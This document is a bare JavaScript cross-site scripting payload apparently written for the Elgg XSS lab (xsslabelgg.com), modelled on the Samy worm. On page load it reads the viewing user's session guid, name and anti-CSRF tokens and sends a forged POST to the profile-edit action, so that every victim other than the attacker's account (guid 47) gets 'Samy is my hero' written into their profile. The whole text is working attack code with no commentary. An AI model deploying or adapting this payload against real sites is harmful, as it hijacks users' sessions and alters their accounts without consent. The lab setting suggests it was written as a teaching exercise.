<script type="text/javascript">
window.onload = function() {
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var name = "&name=" + elgg.session.user.name;
    var desc = "&description=Samy is my hero" + "&accesslevel[description]=2";

    // Construct the content of your url.
    var sendurl = "http://wwww.xsslabelgg.com/action/profile/edit";
    var content = guid + name + desc + ts + token;
    var samyGuid = 47;

    if (elgg.session.user.guid != samyGuid) {
        //Create and send Ajax request to modify profile
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader(
            "Content-Type",
            "application/x-www-form-urlencoded"
        );
        Ajax.send(content);
    }
};
</script>
